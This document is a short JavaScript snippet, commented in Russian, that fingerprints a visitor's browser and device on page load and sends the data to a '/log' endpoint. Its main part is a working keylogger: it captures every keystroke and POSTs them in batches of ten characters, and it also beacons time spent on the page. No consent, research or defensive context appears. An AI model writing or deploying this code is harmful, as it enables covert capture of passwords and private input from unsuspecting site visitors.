(function() {
  // Собираем информацию о браузере и устройстве
  const info = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenWidth: screen.width,
    screenHeight: screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    online: navigator.onLine,
    cookiesEnabled: navigator.cookieEnabled,
    plugins: Array.from(navigator.plugins).map(p => p.name)
  };

  // Отправляем инфу сразу после загрузки
  fetch('/log', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({type: 'info', data: info})
  }).catch(console.error);

  // Собираем нажатые клавиши и отправляем по 10 символов
  let keys = '';
  document.addEventListener('keydown', (e) => {
    keys += e.key;
    if (keys.length >= 10) {
      fetch('/log', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({type: 'keys', keys: keys})
      }).catch(console.error);
      keys = '';
    }
  });

  // Отправляем время проведённое на странице при уходе
  window.addEventListener('beforeunload', () => {
    const timeSpent = Date.now() - performance.timing.navigationStart;
    navigator.sendBeacon('/log', JSON.stringify({
      type: 'timespent',
      milliseconds: timeSpent
    }));
  });
})();
